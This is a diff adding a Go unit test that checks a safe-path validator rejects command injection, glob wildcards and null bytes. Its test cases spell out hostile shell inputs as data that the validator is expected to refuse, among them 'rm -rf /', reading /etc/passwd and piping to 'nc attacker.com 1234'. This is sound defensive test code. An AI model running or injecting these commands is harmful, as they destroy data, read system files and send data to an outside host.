@@ -75,6 +75,58 @@ func TestValidatePath(t *testing.T) {
 	}
 }
 
+func TestValidateSafePath(t *testing.T) {
+	tests := []struct {
+		name    string
+		path    string
+		wantErr bool
+	}{
+		// Valid paths
+		{"valid absolute path", "/home/user/config", false},
+		{"valid with dashes", "/mnt/nas-media", false},
+		{"valid with underscores", "/var/lib/my_app", false},
+		{"valid with dots", "/etc/my.app.conf", false},
+		{"valid complex path", "/mnt/storage/media/movies-2024", false},
+
+		// Basic validation failures
+		{"invalid - relative path", "relative/path", true},
+		{"invalid - empty", "", true},
+
+		// Command injection attempts
+		{"injection - semicolon", "/mnt/test; rm -rf /", true},
+		{"injection - ampersand", "/mnt/test && cat /etc/passwd", true},
+		{"injection - pipe", "/mnt/test | nc attacker.com 1234", true},
+		{"injection - dollar", "/mnt/test$(whoami)", true},
+		{"injection - backtick", "/mnt/test`id`", true},
+		{"injection - subshell open", "/mnt/test(ls)", true},
+		{"injection - subshell close", "/mnt/test)", true},
+		{"injection - redirect in", "/mnt/test < /etc/passwd", true},
+		{"injection - redirect out", "/mnt/test > /tmp/output", true},
+		{"injection - newline", "/mnt/test\nrm -rf /", true},
+		{"injection - carriage return", "/mnt/test\rrm -rf /", true},
+
+		// Glob wildcards
+		{"wildcard - asterisk", "/mnt/test*", true},
+		{"wildcard - question", "/mnt/test?", true},
+		{"wildcard - bracket open", "/mnt/test[", true},
+		{"wildcard - bracket close", "/mnt/test]", true},
+		{"wildcard - brace open", "/mnt/test{", true},
+		{"wildcard - brace close", "/mnt/test}", true},
+
+		// Null byte
+		{"null byte", "/mnt/test\x00", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateSafePath(tt.path)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateSafePath() error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
 func TestValidateUsername(t *testing.T) {
 	tests := []struct {
 		name     string
